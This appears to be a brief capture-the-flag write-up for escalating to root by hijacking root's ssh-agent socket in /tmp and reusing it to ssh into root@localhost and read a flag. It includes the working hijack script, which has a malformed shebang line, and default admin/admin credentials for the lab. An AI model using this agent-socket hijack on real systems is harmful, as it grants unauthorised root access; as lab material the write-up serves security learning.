Once your are in the challenge, login via SSH to the server (username: admin, password: admin).
Every minute, the root user comes and taunt you. It creates a folder in /tmp where we can get his socket. The problem is that this folder is quickly deleted. So we are going to create a script that gets its socket, and log in as root.

```
#!/bin/bash/expect -f

cd /tmp/ssh-*
export SSH_AUTH_SOCK=$PWD/$(ls)
ssh-add -l #Lists fingerprints of all identities currently represented by the
    agent.
ssh root@localhost
whoami
```

When the root use send a message, quickly type
```
source script.sh
```

Then login as root, aim to /root, and cat .flag !
